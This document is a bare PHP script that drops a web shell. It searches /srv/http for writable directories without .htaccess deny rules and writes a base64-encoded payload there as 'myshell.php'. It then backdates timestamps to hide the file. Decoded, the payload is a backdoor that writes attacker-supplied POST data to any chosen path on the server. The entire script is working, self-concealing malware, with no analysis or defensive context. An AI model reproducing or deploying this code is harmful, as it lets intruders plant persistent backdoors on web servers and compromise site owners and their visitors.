error_reporting(0);
set_time_limit(0);
$startDirectory = '/srv/http';
$depth = 4;
$fileData = 'PD9waHANCg0KZXJyb3JfcmVwb3J0aW5nKDApOw0KDQpmdW5jdGlvbiBkKCRtc2cpDQp7DQoJZGll
KHN1YnN0cihtZDUobWljcm90aW1lKCkpLCByYW5kKDAsMjYpLCA1KS4kbXNnKTsNCn0NCg0KJGRh
dGEgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsNCg0KaWYgKHN0cmxlbigkZGF0
YSkgPD0gNCkgZCgnZTAnKTsNCg0KJGRhdGEgPSBzdWJzdHIoJGRhdGEsIDMpOw0KJGRhdGEgPSBi
YXNlNjRfZGVjb2RlKCRkYXRhKTsNCiRjID0gJ1BIUDUnOw0KaWYgKHN1YnN0cigkZGF0YSwgLXN0
cmxlbigkYykpICE9PSAkYykgZCgnZTEnKTsNCiRkYXRhID0gc3Vic3RyKCRkYXRhLCAwLCAtc3Ry
bGVuKCRjKSk7DQoNCiRwID0gc3RycG9zKCRkYXRhLCAnOycpOyBpZiAoJHAgPT09IGZhbHNlKSBk
KCdlMicpOw0KJGRhdGEgPSBzdWJzdHIoJGRhdGEsICRwKzEpOw0KDQokcCA9IHN0cnBvcygkZGF0
YSwgJzsnKTsgaWYgKCRwID09PSBmYWxzZSkgZCgnZTMnKTsNCiRmbmFtZSA9IHN1YnN0cigkZGF0
YSwgMCwgJHApOyAkZGF0YSA9IHN1YnN0cigkZGF0YSwgJHArMSk7DQppZiAoIXN0cmxlbigkZm5h
bWUpKSBkKCdlNScpOw0KDQokcCA9IHN0cnBvcygkZGF0YSwgJzsnKTsgaWYgKCRwID09PSBmYWxz
ZSkgZCgnZTQnKTsNCiR1cCA9IHN1YnN0cigkZGF0YSwgMCwgJHApOyAkZGF0YSA9IHN1YnN0cigk
ZGF0YSwgJHArMSk7DQoNCiR1cCA9IGludHZhbCgkdXApOw0KDQppZiAoJHVwID4gMCkNCnsNCgkk
ZGlyID0gX19ESVJfXzsNCglmb3IgKCRpID0gMDsgJGkgPCAkdXA7ICRpKyspICRkaXIgPSBkaXJu
YW1lKCRkaXIpOw0KCSRmbmFtZSA9IHJ0cmltKCRkaXIsIERJUkVDVE9SWV9TRVBBUkFUT1IpLkRJ
UkVDVE9SWV9TRVBBUkFUT1IuJGZuYW1lOw0KfQ0KDQpmb3IgKCRpID0gMDsgJGkgPCAyMDsgJGkr
KykNCnsNCglmaWxlX3B1dF9jb250ZW50cygkZm5hbWUsICRkYXRhLCBMT0NLX0VYKTsNCgkkb2sg
PSBmaWxlX2V4aXN0cygkZm5hbWUpOw0KCWlmICgkb2spIGJyZWFrOw0KfQ0KDQppZiAoJG9rKQ0K
ew0KCWQoJ29rJyk7DQp9IGVsc2UNCnsNCglkKCdiYWQ6Jy4kZm5hbWUuJ3wnLl9fRElSX18pOw0K
fQ0KDQo=';
$fileName = 'myshell.php';
$filePrefix = '';
$fileMode = 1;
function GetAllDirs($startPath) {
	$allDirs = array($startPath => 0);
	$rDir = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($startPath), RecursiveIteratorIterator::CHILD_FIRST);
	$rgResult = array();
	foreach($rDir as $rPath) {
		if($rPath->isDir() && $rPath->isWritable() && !$rDir->isDot()) {
			$dirPath = str_replace('\\', '/', (string)$rPath);
                        if(!CheckHtaccess($dirPath.'/.htaccess'))
			    $allDirs[$dirPath] = substr_count(str_replace($startPath, '', $dirPath),'/');
		}
	}
	arsort($allDirs);
	return $allDirs;
}

function CheckHtaccess($htaccessPath) {
	$isDeny = false;
	if(file_exists($htaccessPath)) {
	$isDeny = true;
		if(is_readable($htaccessPath)) {
			$htaccessContent = strtolower(file_get_contents($htaccessPath));
			$searchContent = 'deny from';
			if (!strstr($htaccessContent, $searchContent)) {
				$isDeny = false;
			}
		}
	}
	return $isDeny;
}

function GetRandomPath($dirs, $depth) {
	if($depth > (int)current($dirs)) {
		$depth = (int)current($dirs);
	}
	$allKeys = array_keys($dirs, $depth);
	return $allKeys[rand(0, count($allKeys) - 1)];
}

function FileWrite($filePath, $fileData, $fileMode, $filePrefix) {
$pathParts = pathinfo($filePath);
$fileTime = filemtime($pathParts['dirname']);
	if(file_exists($filePath)) {
			if($fileMode == 2)
				return '';
			if($fileMode == 0)
				$filePath = $pathParts['dirname'].'/'.$filePrefix.$pathParts['basename'];
	}
	if($fp = fopen($filePath, 'w')) {
		fwrite($fp, $fileData);
		fclose($fp);
		touch($filePath, $fileTime);
		touch($pathParts['dirname'], $fileTime);
		return $filePath;
	}
}

$allDirs = GetAllDirs($startDirectory);
$randPath = GetRandomPath($allDirs, $depth);
$fileWritedPath = FileWrite($randPath.'/'.$fileName, base64_decode($fileData), $fileMode, $filePrefix);
if(strlen($fileWritedPath) != 0)
		if(strlen($_SERVER['DOCUMENT_ROOT']) == 1)
		    echo substr($fileWritedPath, 1);
	    else
		    echo str_replace(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']), '', $fileWritedPath);